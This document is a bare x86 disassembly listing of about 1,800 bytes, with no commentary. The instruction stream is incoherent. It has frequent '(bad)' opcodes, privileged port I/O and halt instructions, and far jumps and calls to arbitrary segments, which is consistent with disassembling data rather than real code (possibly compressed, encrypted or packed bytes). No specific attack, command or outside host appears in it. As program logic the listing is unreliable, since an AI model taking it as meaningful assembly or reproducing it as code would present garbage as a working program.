  410abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410abe:	cmp    dl,BYTE PTR [esp+ebx*1]
  410ac1:	data16 xchg BYTE PTR [ebx+0x451640a1],dh
  410ac8:	stos   BYTE PTR es:[edi],al
  410ac9:	lods   al,BYTE PTR ds:[esi]
  410aca:	aam    0xa8
  410acc:	retf   0x51b7
  410acf:	inc    ecx
  410ad0:	dec    edi
  410ad1:	out    dx,al
  410ad2:	xchg   ebx,eax
  410ad3:	push   esp
  410ad4:	je     0x410b3e
  410ad6:	dec    esi
  410ad7:	inc    esp
  410ad8:	sahf   
  410ad9:	jle    0x410aea
  410adb:	stc    
  410adc:	jae    0x410ad0
  410ade:	lods   eax,DWORD PTR ds:[esi]
  410adf:	jg     0x410a77
  410ae1:	popa   
  410ae2:	inc    eax
  410ae3:	push   ebx
  410ae4:	pusha  
  410ae5:	cmp    al,0xa3
  410ae7:	add    ecx,DWORD PTR [ebp+0x16]
  410aea:	or     eax,0x44337b20
  410aef:	stos   DWORD PTR es:[edi],eax
  410af0:	retf   0x35
  410af3:	fcomp  DWORD PTR [ecx-0x73067979]
  410af9:	bound  eax,QWORD PTR [eax+ebx*2-0x39]
  410afd:	cmp    dh,BYTE PTR [edx-0x1da95bd2]
  410b03:	ds icebp 
  410b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b06:	adc    BYTE PTR [edi],bl
  410b08:	sub    ch,bh
  410b0a:	push   ecx
  410b0b:	sub    dl,ah
  410b0d:	adc    esi,0xe5d305e9
  410b13:	pop    ebx
  410b14:	mov    dh,0x41
  410b16:	xor    bh,bh
  410b18:	cmp    edi,DWORD PTR [esi]
  410b1a:	imul   eax,DWORD PTR [ecx-0x7886dbec],0x3b2cd1c8
  410b24:	mov    WORD PTR [ecx+0x4c],cs
  410b27:	dec    eax
  410b28:	or     BYTE PTR ds:0x70236664,ah
  410b2e:	icebp  
  410b2f:	(bad)  
  410b30:	sbb    DWORD PTR [ebx],ebp
  410b32:	rol    BYTE PTR [ecx+edi*8+0x3b],0x2f
  410b37:	pop    edx
  410b38:	js     0x410b95
  410b3a:	fsubr  DWORD PTR [ecx+0x6ea4c2dc]
  410b40:	push   ss
  410b41:	(bad)  
  410b42:	cmc    
  410b43:	add    al,0x49
  410b45:	cmp    BYTE PTR [ecx-0x41],al
  410b48:	out    dx,eax
  410b49:	hlt    
  410b4a:	mov    ebp,0x42271893
  410b4f:	jp     0x410bc3
  410b51:	mov    ah,0x52
  410b53:	lods   eax,DWORD PTR ds:[esi]
  410b54:	cmp    edi,DWORD PTR [ebx+eax*2-0x58]
  410b58:	rcl    ah,1
  410b5a:	sahf   
  410b5b:	or     BYTE PTR [edx-0x33],0x6
  410b5f:	xor    BYTE PTR [ebp+0x6427b59f],al
  410b65:	adc    DWORD PTR [esi-0x5],esi
  410b68:	adc    BYTE PTR [ecx+0x1225c31e],bl
  410b6e:	and    eax,0xce8f1695
  410b73:	jl     0x410b4d
  410b75:	call   0xf5b7:0xdf3d7b4f
  410b7c:	loop   0x410b40
  410b7e:	loope  0x410be9
  410b80:	sahf   
  410b81:	and    ch,ah
  410b83:	imul   edx,DWORD PTR [esi-0x4],0xac8e6445
  410b8a:	inc    ebp
  410b8b:	pop    ds
  410b8c:	test   al,0x40
  410b8e:	ss ret 
  410b90:	mov    dh,0x41
  410b92:	push   edi
  410b93:	fimul  DWORD PTR [edi]
  410b95:	std    
  410b96:	(bad)  
  410b97:	ds mov ecx,0xddbab2d8
  410b9d:	fisubr WORD PTR [esi]
  410b9f:	sub    BYTE PTR [edi-0x6eb2abe5],dl
  410ba5:	pop    edx
  410ba6:	ret    0x9ede
  410ba9:	mov    ah,0x99
  410bab:	push   es
  410bac:	ror    BYTE PTR [eax+0x2b],cl
  410baf:	icebp  
  410bb0:	push   esi
  410bb1:	jecxz  0x410beb
  410bb3:	stos   BYTE PTR es:[edi],al
  410bb4:	in     eax,dx
  410bb5:	hlt    
  410bb6:	outs   dx,BYTE PTR ds:[esi]
  410bb7:	retf   
  410bb8:	(bad)  
  410bb9:	icebp  
  410bba:	ja     0x410bed
  410bbc:	xor    ebp,DWORD PTR [edx]
  410bbe:	and    eax,0x57e0d636
  410bc3:	rol    DWORD PTR [ebx-0x64e5777c],0x38
  410bca:	pushf  
  410bcb:	stos   BYTE PTR es:[edi],al
  410bcc:	jae    0x410b70
  410bce:	sbb    eax,esp
  410bd0:	cmp    ebp,esp
  410bd2:	and    eax,0x747846eb
  410bd7:	lods   eax,DWORD PTR ds:[esi]
  410bd8:	daa    
  410bd9:	leave  
  410bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bdb:	mov    edx,0x4c865f0b
  410be0:	push   ss
  410be1:	fidivr WORD PTR gs:[ecx]
  410be4:	and    ebp,DWORD PTR [ebp-0x4ff3fee3]
  410bea:	mov    cl,0x52
  410bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bed:	hlt    
  410bee:	mov    bh,0x7
  410bf0:	mov    dh,0xa2
  410bf2:	cli    
  410bf3:	in     al,0xd9
  410bf5:	rol    DWORD PTR [edi-0x4e309165],0xcb
  410bfc:	xor    edi,DWORD PTR [ecx+0x297d9a54]
  410c02:	adc    dh,ch
  410c04:	test   DWORD PTR [edx],esi
  410c06:	popf   
  410c07:	mov    eax,ds:0x74aa6a92
  410c0c:	sub    DWORD PTR [edx],ebp
  410c0e:	xor    ebx,DWORD PTR [esi]
  410c10:	cs fwait
  410c12:	push   esi
  410c13:	dec    edx
  410c14:	jmp    0xeb263509
  410c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c1a:	and    edi,esi
  410c1c:	fs jmp 0x410c15
  410c1f:	arpl   ax,bp
  410c21:	add    esi,DWORD PTR [ecx-0x4e]
  410c24:	jmp    0x8d15fab6
  410c29:	iret   
  410c2a:	pop    eax
  410c2b:	(bad)  
  410c2c:	xlat   BYTE PTR ds:[ebx]
  410c2d:	push   ds
  410c2e:	and    al,BYTE PTR [eax-0x58]
  410c31:	mov    bh,0xf0
  410c33:	jo     0x410c9b
  410c35:	pop    esp
  410c36:	mov    bh,0xb7
  410c38:	ret    0x4b17
  410c3b:	test   al,0x61
  410c3d:	leave  
  410c3e:	dec    edi
  410c3f:	repz scas eax,DWORD PTR es:[di]
  410c42:	fdivr  DWORD PTR [ecx]
  410c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c45:	mov    dl,0x7f
  410c47:	sbb    eax,0xb41038e7
  410c4c:	xor    eax,0x4920d758
  410c51:	popa   
  410c52:	clc    
  410c53:	inc    edi
  410c54:	js     0x410bda
  410c56:	ss test eax,0x413e5051
  410c5c:	sbb    BYTE PTR ds:[edi+0xb],0xb7
  410c61:	cmp    DWORD PTR [edx],0x870bd4f1
  410c67:	mov    ah,0x7c
  410c69:	sbb    ah,BYTE PTR [ebx*8+0x23bdf032]
  410c70:	mov    dl,0x47
  410c72:	adc    BYTE PTR [edx+0x54],al
  410c75:	dec    ecx
  410c76:	dec    esp
  410c77:	mov    WORD PTR [esi+ebx*2-0x6d],?
  410c7b:	sar    DWORD PTR [esi-0x509ee7d0],0x20
  410c82:	mov    BYTE PTR [ebx-0x65],dl
  410c85:	aad    0x66
  410c87:	add    eax,0xb9c63488
  410c8c:	add    al,0x5a
  410c8e:	hlt    
  410c8f:	jmp    0xf08d:0x59e0718a
  410c96:	lahf   
  410c97:	jp     0x410c82
  410c99:	mov    ecx,0x106e7b5f
  410c9e:	mov    esi,0xc85e7d4c
  410ca3:	push   ds
  410ca4:	mov    ds,WORD PTR ds:0x94f32569
  410caa:	xor    ebx,DWORD PTR ds:0xcf120138
  410cb0:	mov    BYTE PTR [edi-0x78],bl
  410cb3:	pop    ebx
  410cb4:	dec    edi
  410cb5:	jecxz  0x410cb1
  410cb7:	(bad)  
  410cb8:	xchg   esi,eax
  410cb9:	ret    0xc158
  410cbc:	adc    al,0x14
  410cbe:	in     al,dx
  410cbf:	sbb    eax,0x16b2561
  410cc4:	stc    
  410cc5:	push   esp
  410cc6:	sbb    eax,0x7a8b49b6
  410ccb:	cmp    cl,BYTE PTR [esi]
  410ccd:	pop    es
  410cce:	sub    ch,cl
  410cd0:	daa    
  410cd1:	push   esp
  410cd2:	mov    bl,BYTE PTR [esi+ebp*8+0x61]
  410cd6:	in     al,0xe5
  410cd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd9:	mov    edi,0xf4325dcf
  410cde:	stc    
  410cdf:	scas   al,BYTE PTR es:[edi]
  410ce0:	xchg   edi,eax
  410ce1:	xor    DWORD PTR ds:0x177cdcab,esi
  410ce7:	cwde   
  410ce8:	push   ebp
  410ce9:	and    al,0xa0
  410ceb:	pop    edx
  410cec:	inc    esp
  410ced:	dec    ecx
  410cee:	add    eax,0x1b9858a2
  410cf3:	retf   
  410cf4:	pop    eax
  410cf5:	inc    edi
  410cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cf7:	pop    es
  410cf8:	jo     0x410c7a
  410cfa:	fs add cl,ah
  410cfd:	push   esp
  410cff:	in     al,0xcb
  410d01:	popa   
  410d02:	or     bh,BYTE PTR [edx-0x3d]
  410d05:	xlat   BYTE PTR ds:[ebx]
  410d06:	mov    esp,0xb92180e1
  410d0b:	enter  0x7dbc,0xc2
  410d0f:	mov    cl,0x35
  410d11:	jmp    0xed64:0xda1fa0f5
  410d18:	or     al,0x2a
  410d1a:	iret   
  410d1b:	out    0xbc,eax
  410d1d:	hlt    
  410d1e:	xlat   BYTE PTR ds:[ebx]
  410d1f:	cmp    eax,0x7da51199
  410d24:	test   BYTE PTR [edi-0x28],0xf4
  410d28:	icebp  
  410d29:	dec    esp
  410d2a:	jecxz  0x410d98
  410d2c:	imul   esi,DWORD PTR [ecx+0x1c],0x742f052f
  410d33:	fdiv   QWORD PTR [ecx+0x22170277]
  410d39:	sbb    eax,0x9410e680
  410d3e:	leave  
  410d3f:	jp     0x410d4e
  410d41:	jmp    0x49163b96
  410d46:	loopne 0x410d91
  410d48:	and    dh,BYTE PTR [ebx-0x54]
  410d4b:	pushf  
  410d4c:	ret    0x19f4
  410d4f:	int    0xca
  410d51:	or     DWORD PTR [eax+0x45791866],edi
  410d57:	jno    0x410d06
  410d59:	add    DWORD PTR [edi+0x2c],edi
  410d5c:	fadd   DWORD PTR [esi]
  410d5e:	sub    dl,BYTE PTR [edi+0x73]
  410d61:	in     al,dx
  410d62:	and    al,0xb0
  410d64:	mov    DWORD PTR [edx-0x74506cae],ebp
  410d6a:	mov    edx,0x2155f5b1
  410d6f:	bound  esi,QWORD PTR [ebx-0x3a]
  410d72:	jmp    0x64f1f016
  410d77:	cwde   
  410d78:	(bad)  
  410d79:	in     al,0xc0
  410d7b:	loope  0x410d99
  410d7d:	jb     0x410dc4
  410d7f:	lea    edx,[eax+ebx*2]
  410d82:	and    DWORD PTR [ecx+0x3d0b0043],eax
  410d88:	scas   eax,DWORD PTR es:[edi]
  410d89:	or     eax,0xb669be57
  410d8e:	dec    edi
  410d8f:	and    edx,DWORD PTR [edx+0x1885d778]
  410d95:	inc    esp
  410d96:	push   ebx
  410d97:	imul   eax,DWORD PTR [edx],0xfee91a96
  410d9d:	fisttp QWORD PTR [edx+esi*2+0x539d7f87]
  410da4:	das    
  410da5:	test   DWORD PTR [eax+0x63],ebp
  410da8:	enter  0x96d8,0xbf
  410dac:	(bad)  
  410dad:	sar    BYTE PTR [edx+0x51],1
  410db0:	dec    eax
  410db1:	push   ebx
  410db2:	fld    DWORD PTR [edx]
  410db4:	pop    ebx
  410db5:	outs   dx,DWORD PTR ds:[esi]
  410db6:	repnz xchg ecx,eax
  410db8:	cmp    dh,dl
  410dba:	sbb    ebx,edx
  410dbc:	jle    0x410d56
  410dbe:	mov    dl,0x73
  410dc0:	imul   BYTE PTR [eax+0x50]
  410dc3:	adc    DWORD PTR [ebp+0x52755226],ebp
  410dc9:	in     al,dx
  410dca:	add    edx,DWORD PTR gs:[esi]
  410dcd:	inc    edi
  410dce:	test   eax,0xc30b6dc
  410dd3:	stos   BYTE PTR es:[edi],al
  410dd4:	sbb    al,0x2
  410dd6:	or     bh,BYTE PTR [edx-0x2e2c40dd]
  410ddc:	push   ecx
  410ddd:	pusha  
  410dde:	dec    ecx
  410ddf:	fidivr DWORD PTR gs:[ebp-0x6679e8e2]
  410de6:	jns    0x410de2
  410de8:	lods   al,BYTE PTR ds:[esi]
  410de9:	jno    0x410db1
  410deb:	mov    eax,DWORD PTR [ebx+0x77]
  410dee:	es mov bl,0x2c
  410df1:	cmp    BYTE PTR [ecx-0x3121e246],al
  410df7:	mov    ebx,0xb90bafc4
  410dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dfd:	pop    esi
  410dfe:	mov    cl,0xd9
  410e00:	sbb    BYTE PTR [ecx-0x258ec08e],dl
  410e06:	push   0xffffffae
  410e08:	xchg   esp,eax
  410e09:	mov    edx,0x745676a7
  410e0e:	lahf   
  410e0f:	sub    al,0xf1
  410e11:	add    esp,DWORD PTR [ebp-0xf0ec1b2]
  410e17:	jns    0x410e45
  410e19:	fs sub al,0xda
  410e1c:	std    
  410e1d:	(bad)  
  410e1e:	adc    esp,DWORD PTR ds:0x5c72a76c
  410e24:	cmp    eax,0x371bad62
  410e29:	jno    0x410e98
  410e2b:	push   ss
  410e2c:	das    
  410e2d:	inc    ebp
  410e2e:	icebp  
  410e2f:	sbb    al,0xdd
  410e31:	xchg   edx,eax
  410e32:	(bad)  
  410e33:	cmp    DWORD PTR [ebx+esi*2+0x6d],edx
  410e37:	jnp    0x410dbd
  410e39:	push   0x39
  410e3b:	or     BYTE PTR [edi+0x7a],al
  410e3e:	ja     0x410ead
  410e40:	repnz fs ins DWORD PTR es:[edi],dx
  410e43:	sbb    al,0x5b
  410e45:	mov    esp,0x46c53a8c
  410e4a:	hlt    
  410e4b:	out    dx,eax
  410e4c:	sub    BYTE PTR [esi-0x50],dl
  410e4f:	idiv   DWORD PTR [eax-0x3]
  410e52:	fidiv  DWORD PTR [ecx]
  410e54:	dec    ebx
  410e55:	add    dl,bl
  410e57:	mov    al,0x8
  410e59:	(bad)  
  410e5c:	daa    
  410e5d:	ror    bl,0x28
  410e60:	shl    DWORD PTR [edx-0x19],0x46
  410e64:	push   ebp
  410e65:	sar    DWORD PTR [esi-0x77277bb0],1
  410e6b:	adc    ebp,DWORD PTR [esi]
  410e6d:	pop    esp
  410e6e:	jno    0x410ed5
  410e70:	cmp    BYTE PTR [ebp+eax*8+0x42],bh
  410e74:	inc    esi
  410e75:	pop    ecx
  410e76:	xchg   eax,ebp
  410e78:	mov    dl,0x20
  410e7a:	inc    edi
  410e7b:	scas   eax,DWORD PTR es:[edi]
  410e7c:	fsubr  DWORD PTR [ebx]
  410e7e:	sar    DWORD PTR [edi],1
  410e80:	test   BYTE PTR [edx+0x48],al
  410e83:	ret    
  410e84:	xor    DWORD PTR [ecx+0x23],esi
  410e87:	jmp    0xaff5:0x29d6164f
  410e8e:	test   al,0x63
  410e90:	adc    dl,0xd6
  410e93:	or     al,0xcb
  410e95:	sub    eax,0x8d1f0685
  410e9a:	or     ecx,DWORD PTR [ebx-0x6ae901e2]
  410ea0:	pop    ebp
  410ea1:	pop    edx
  410ea2:	inc    eax
  410ea3:	(bad)  
  410ea4:	sbb    BYTE PTR [eax+eax*4+0x3f167955],ah
  410eab:	add    al,0x7d
  410ead:	mov    DWORD PTR [ebx+0x27],edi
  410eb0:	add    bh,al
  410eb2:	pop    edi
  410eb3:	inc    eax
  410eb4:	loopne 0x410e40
  410eb6:	jae    0x410eef
  410eb8:	icebp  
  410eb9:	and    al,0x1c
  410ebb:	enter  0xd,0xb
  410ebf:	mov    eax,0x34bf97f3
  410ec4:	pop    ds
  410ec5:	and    al,0x9c
  410ec8:	xor    al,0x28
  410eca:	xchg   BYTE PTR [edi-0x4d],dh
  410ecd:	cmp    BYTE PTR [ebp-0x68d70ced],bh
  410ed3:	xchg   BYTE PTR [eax-0x1ca84755],bh
  410ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eda:	push   0x3a8951a
  410edf:	mov    al,al
  410ee1:	je     0x410f47
  410ee3:	inc    ebp
  410ee4:	out    0x14,eax
  410ee6:	cdq    
  410ee7:	and    dl,BYTE PTR [eax-0x77a73a6f]
  410eed:	jo     0x410f06
  410eef:	call   0x1476cb94
  410ef4:	jle    0x410ebd
  410ef6:	dec    esi
  410ef7:	xchg   edi,eax
  410ef8:	push   edx
  410ef9:	adc    eax,0x90e1ecc8
  410efe:	xchg   bl,bh
  410f00:	jecxz  0x410ec6
  410f02:	cmp    al,0x59
  410f04:	push   esp
  410f05:	xchg   esi,eax
  410f06:	xchg   ah,dl
  410f08:	sub    eax,0xfcbbef84
  410f0d:	cld    
  410f0e:	lds    esp,FWORD PTR [ebx+esi*4+0x6b]
  410f12:	arpl   WORD PTR [ecx+0x8],ax
  410f15:	dec    esi
  410f16:	jmp    0xd2ae:0x3a876d63
  410f1d:	aam    0xad
  410f1f:	push   ebx
  410f20:	in     al,0xfd
  410f22:	mov    ds:0x23237281,al
  410f27:	and    DWORD PTR [ebx-0x67765455],0x2aace6b
  410f31:	jne    0x410f1e
  410f33:	cmc    
  410f34:	dec    esi
  410f35:	lock jb 0x410ebb
  410f38:	inc    edx
  410f39:	cmp    al,0x0
  410f3b:	pop    ecx
  410f3c:	push   esi
  410f3d:	sub    ch,al
  410f3f:	sbb    ch,BYTE PTR [edi]
  410f41:	xchg   DWORD PTR [eax],edx
  410f43:	das    
  410f44:	pop    ebx
  410f45:	shl    edx,1
  410f47:	jns    0x410f12
  410f49:	lods   al,BYTE PTR ds:[esi]
  410f4a:	inc    esp
  410f4b:	call   0x5846a166
  410f50:	sbb    edi,eax
  410f52:	pop    esp
  410f53:	jb     0x410f68
  410f55:	loopne 0x410f5f
  410f57:	mov    esp,esp
  410f59:	jle    0x410f2a
  410f5b:	pop    edx
  410f5c:	jne    0x410ee3
  410f5e:	xchg   edi,eax
  410f5f:	das    
  410f60:	add    DWORD PTR [edx+0x30ea88dd],eax
  410f66:	sub    DWORD PTR [eax+0x7],ebp
  410f69:	hlt    
  410f6a:	les    edx,FWORD PTR [ebp-0x4adc781f]
  410f70:	sbb    DWORD PTR [ebp+ebp*1+0x2b05fabe],edi
  410f77:	mov    ebx,0x3f504314
  410f7c:	popf   
  410f7d:	adc    eax,0x153c7096
  410f82:	adc    al,0xea
  410f84:	lds    edx,FWORD PTR [ecx-0x1290b333]
  410f8a:	cmp    ebp,DWORD PTR [edx*1+0x6abb582c]
  410f91:	xor    cl,BYTE PTR [edi-0xc]
  410f94:	sbb    cl,dh
  410f96:	cmp    DWORD PTR [esi+0x7ed05b47],esp
  410f9c:	adc    BYTE PTR [edi],ah
  410f9e:	mov    edx,0x9f4c8ff1
  410fa3:	pop    ecx
  410fa4:	xchg   edx,eax
  410fa5:	inc    ecx
  410fa6:	test   DWORD PTR [ecx+0x3ed87ddc],ecx
  410fac:	scas   al,BYTE PTR es:[edi]
  410fad:	pop    ds
  410fae:	cld    
  410faf:	xor    DWORD PTR [ebx-0x5c],eax
  410fb2:	mov    al,ds:0x5cbaec3e
  410fb7:	test   BYTE PTR [esi+edi*2-0x2b614aa7],bh
  410fbe:	xchg   edx,eax
  410fbf:	popf   
  410fc0:	dec    ebp
  410fc1:	or     eax,0x7a4cd4b1
  410fc6:	mov    ecx,0x33b02297
  410fcb:	sbb    BYTE PTR [edx+esi*4+0x38f2371],dh
  410fd2:	xchg   edx,eax
  410fd3:	les    ebx,FWORD PTR [esi+0x59]
  410fd6:	jno    0x410f77
  410fd8:	inc    ebp
  410fd9:	jg     0x410fa8
  410fdb:	or     edx,DWORD PTR ds:0x7e9e00e4
  410fe1:	out    dx,al
  410fe2:	scas   al,BYTE PTR es:[edi]
  410fe3:	pop    ss
  410fe4:	mov    dl,0x5e
  410fe6:	mov    bl,0x81
  410fe8:	aam    0x9c
  410fea:	jl     0x41105b
  410fec:	in     al,0x97
  410fee:	loope  0x410fbc
  410ff0:	ins    BYTE PTR es:[edi],dx
  410ff1:	hlt    
  410ff2:	in     al,0x28
  410ff4:	xchg   ecx,eax
  410ff5:	jnp    0x411064
  410ff7:	cs cld 
  410ff9:	(bad)  
  410ffa:	out    dx,al
  410ffb:	sar    DWORD PTR [ecx-0x7e],0x76
  410fff:	call   0x4489:0xddcd8fdc
  411006:	push   ds
  411007:	in     al,dx
  411008:	loop   0x411088
  41100a:	add    bl,al
  41100c:	rol    ebp,1
  41100e:	mov    ecx,0xb7030a18
  411013:	mov    dl,0x44
  411015:	out    dx,eax
  411016:	add    eax,0x97b21f6c
  41101b:	sar    BYTE PTR [eax-0x21ddff4d],1
  411021:	pop    ss
  411022:	lock in eax,0x4
  411025:	cs pop esp
  411027:	add    ebp,DWORD PTR [edx+0x3be9e234]
  41102d:	adc    eax,0xdb74509b
  411032:	mov    edi,0x1341bb1d
  411037:	or     eax,0x6b58a7b0
  41103c:	iret   
  41103d:	test   eax,0xc19cf9b7
  411042:	inc    ebp
  411043:	aaa    
  411044:	shl    eax,1
  411046:	repz xchg esp,eax
  411048:	rcr    bh,cl
  41104a:	call   0x3cb:0x50a303b
  411051:	out    0xc0,eax
  411053:	rep stos DWORD PTR es:[edi],eax
  411055:	pop    edx
  411056:	or     eax,0x989c12e8
  41105b:	jmp    0x48ed:0x905fc3da
  411062:	fwait
  411063:	and    dh,BYTE PTR [eax]
  411065:	xchg   esp,eax
  411066:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411068:	add    al,0xb
  41106a:	retf   0x8f94
  41106d:	call   0xadc04333
  411072:	jo     0x4110e9
  411074:	mov    al,0x4d
  411076:	jge    0x41102a
  411078:	hlt    
  411079:	fst    DWORD PTR [ecx+0x7d967c5a]
  41107f:	xchg   edx,eax
  411080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411081:	scas   eax,DWORD PTR es:[edi]
  411082:	xchg   esp,eax
  411083:	rcl    bh,0x32
  411086:	div    BYTE PTR [ebx]
  411088:	idiv   edi
  41108a:	push   0xffffffd6
  41108c:	fistp  QWORD PTR [edx+edx*4-0x51]
  411090:	loop   0x4110aa
  411092:	cmp    al,BYTE PTR [ebx+0x357e9a76]
  411098:	ret    
  411099:	adc    al,0xcb
  41109b:	mov    dl,0xec
  41109d:	pop    ebx
  41109e:	mov    ebx,0x902e282a
  4110a3:	dec    eax
  4110a4:	mov    dl,0x1f
  4110a6:	sub    al,0xfc
  4110a8:	(bad)  
  4110a9:	nop
  4110aa:	xor    al,ah
  4110ac:	call   0x668c:0xecdab41f
  4110b3:	sub    al,0x22
  4110b5:	test   BYTE PTR [edx+0x33],ah
  4110b8:	add    edi,DWORD PTR ds:0xd8ed8dc7
  4110be:	pop    eax
  4110bf:	daa    
  4110c0:	xor    eax,0xb48b527e
  4110c5:	cmp    DWORD PTR fs:[edi-0x4dcc4830],ecx
  4110cc:	add    bh,0xb4
  4110cf:	ret    0xb84f
  4110d2:	retf   0xf8db
  4110d5:	jmp    0x3940:0x614f96c0
  4110dc:	mov    eax,ds:0xe82cbf2a
  4110e1:	sahf   
  4110e2:	mov    WORD PTR [ebp-0x52d8a9b2],es
  4110e8:	xlat   BYTE PTR ds:[ebx]
  4110e9:	and    ebp,DWORD PTR [ecx-0x59]
  4110ec:	fwait
  4110ed:	lods   eax,DWORD PTR ds:[esi]
  4110ee:	lods   al,BYTE PTR ds:[esi]
  4110ef:	sahf   
  4110f0:	adc    BYTE PTR [ebx-0x2e24085d],cl
  4110f6:	mov    cl,ch
  4110f8:	adc    al,al
  4110fa:	push   esp
  4110fb:	inc    edi
  4110fc:	dec    edi
  4110fd:	icebp  
  4110fe:	leave  
  4110ff:	mov    ecx,0x6dcd4c1a
  411104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411105:	int    0x8e
  411107:	and    bl,cl
  411109:	aaa    
  41110a:	sub    ecx,DWORD PTR [ebx+0x25]
  41110d:	sbb    BYTE PTR [eax-0x33],bh
  411110:	inc    esi
  411111:	dec    ebp
  411112:	dec    edx
  411113:	aaa    
  411114:	sub    dh,BYTE PTR [ecx]
  411116:	push   ds
  411117:	lea    ecx,[esi+0x3ef8b8b0]
  41111d:	mov    ch,0x83
  41111f:	adc    DWORD PTR [ecx],0xffffffaa
  411122:	and    eax,ebp
  411124:	scas   al,BYTE PTR es:[edi]
  411125:	cmp    eax,edx
  411127:	ficomp WORD PTR [ecx+0x64]
  41112a:	imul   esi,DWORD PTR [esi-0x41a2936f],0x63
  411131:	daa    
  411132:	popa   
  411133:	mov    DWORD PTR [esi],edx
  411135:	cmc    
  411136:	jne    0x41113c
  411138:	cmc    
  411139:	or     ch,ah
  41113b:	pushf  
  41113c:	mov    al,ds:0xf9ef858f
  411141:	mov    al,0xcc
  411143:	mov    ecx,0x75e44126
  411148:	clc    
  411149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41114a:	push   ebx
  41114b:	jle    0x411123
  41114d:	cli    
  41114e:	mov    esi,0x535a1d
  411153:	pop    edx
  411154:	stos   BYTE PTR es:[edi],al
  411155:	pop    edi
  411156:	stos   DWORD PTR es:[edi],eax
  411157:	inc    ebx
  411158:	fcmovne st,st(2)
  41115a:	mov    ebp,0x58e42cdb
  41115f:	push   ss
  411160:	sub    BYTE PTR [ebx+0x1bdc27b6],0x7e
  411167:	ins    DWORD PTR es:[edi],dx
  411168:	jnp    0x411144
  41116a:	fs pop edi
  41116c:	cli    
  41116d:	jno    0x4111ab
  41116f:	shl    DWORD PTR [eax+0x2a67777d],cl
  411175:	test   al,0xb1
  411177:	fwait
  411178:	cli    
  411179:	adc    eax,0xd9c07eb7
  41117e:	lds    ebp,FWORD PTR [ecx+eiz*4]
  411181:	cmp    DWORD PTR ds:0x56452fca,0xfffffff8
  411188:	or     eax,0xe5cca514
  41118d:	dec    ebp
  41118e:	int3   
  41118f:	pop    es
  411190:	and    BYTE PTR [edi-0x1425824e],ch
  411196:	add    eax,DWORD PTR [eax+0x3b7d9bd6]
  41119c:	pop    edi
  41119d:	add    BYTE PTR [esi-0x49fe7ce0],ch
  4111a3:	and    eax,0x81f936f5
  4111a8:	adc    esp,DWORD PTR [ebx-0x69]
  4111ab:	adc    cl,BYTE PTR [edx+0x3bbb07f1]
  4111b1:	ss pop eax
  4111b3:	sub    DWORD PTR [ecx+0x4a],ebp
  4111b6:	int3   
  4111b7:	aaa    
  4111b8:	nop
  4111b9:	fdivr  QWORD PTR [ebx-0x1a847734]
  4111bf:	les    esi,FWORD PTR [ebp-0x6b012d0a]
  4111c5:	ss imul ebp,DWORD PTR fs:[edi-0x2b],0x31
  4111cb:	mov    eax,0x3b163031
  4111d0:	dec    eax
  4111d1:	retf   
  4111d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d3:	(bad)  [eax-0x1c]
  4111d6:	jne    0x411200
  4111d8:	pushf  
  4111d9:	aas    
  4111da:	dec    esp
  4111db:	into   
  4111dc:	not    ah
  4111de:	call   0xa8cd:0x51170149
  4111e5:	(bad)  
  4111e6:	nop
  4111e7:	xor    BYTE PTR [esp+esi*4-0x52],0x46
  4111ec:	add    eax,esp
  4111ee:	mov    eax,DWORD PTR [edx-0x7e25f0e0]
  4111f4:	sahf   
  4111f5:	add    eax,0x74109d33
  4111fa:	xchg   DWORD PTR [bp+0x3a80],ebx
  4111ff:	test   eax,0xeae59d1c
  411204:	mov    bh,0x27
  411206:	mov    al,ds:0x4e5fa1e7
  41120b:	xchg   BYTE PTR [edx-0x63425e36],dl
  411211:	(bad)  
  411212:	jmp    0x41127e
  411214:	add    al,0x2
  411216:	test   BYTE PTR [eax+0x4b],cl
  411219:	sub    al,0x69
  41121b:	push   ds
  41121c:	mov    eax,ds:0xf6f09bd5
  411221:	jl     0x41123b
  411223:	in     al,0x17
  411225:	add    edi,0x61
  411228:	push   esi
  411229:	clc    
  41122a:	push   0xc6a6d93f
  41122f:	loop   0x411215
  411231:	imul   esp,DWORD PTR [ebx+0x29],0x5425488d
  411238:	(bad)  
  411239:	cmp    esi,esp
  41123b:	or     DWORD PTR [eax-0x2e],eax
  41123e:	push   edi
  41123f:	fadd   DWORD PTR [eax+0x1c]
  411242:	out    0x5c,al
  411244:	xlat   BYTE PTR ds:[ebx]
  411245:	adc    DWORD PTR [edi-0x3a4b7dcb],ebp
  41124b:	rcr    DWORD PTR [edi-0x39d0896f],0x12
  411252:	and    BYTE PTR [esi],ah
  411254:	push   edx
  411255:	push   ebp
  411256:	test   esp,edi
  411258:	sbb    BYTE PTR [ebp+0x3b63dd7e],ch
  41125e:	ins    BYTE PTR es:[edi],dx
  41125f:	inc    esi
  411260:	inc    esp
  411261:	pop    edx
  411262:	sbb    ch,ch
  411264:	xchg   edi,esi
  411266:	xchg   DWORD PTR ds:0x179f1547,ebx
  41126c:	cmp    DWORD PTR [edi+edx*1],esp
  41126f:	xchg   DWORD PTR [edi],edi
  411271:	add    cl,BYTE PTR [esi+0x41]
  411274:	mov    ecx,0xb5796d70
  411279:	adc    cl,BYTE PTR [esi]
  41127b:	inc    ebx
  41127c:	ds js  0x4112ad
  41127f:	mov    ebx,0xf2a7dcb
  411284:	sbb    dl,BYTE PTR [ebp+edx*8-0x4f]
  411288:	cli    
  411289:	(bad)  
  41128b:	rol    DWORD PTR [edx-0xa3becb5],cl
  411291:	sahf   
  411292:	jle    0x411269
  411294:	jae    0x411287
  411296:	jo     0x41121d
  411298:	(bad)  
  411299:	jmp    DWORD PTR [ecx-0x33]
  41129c:	inc    eax
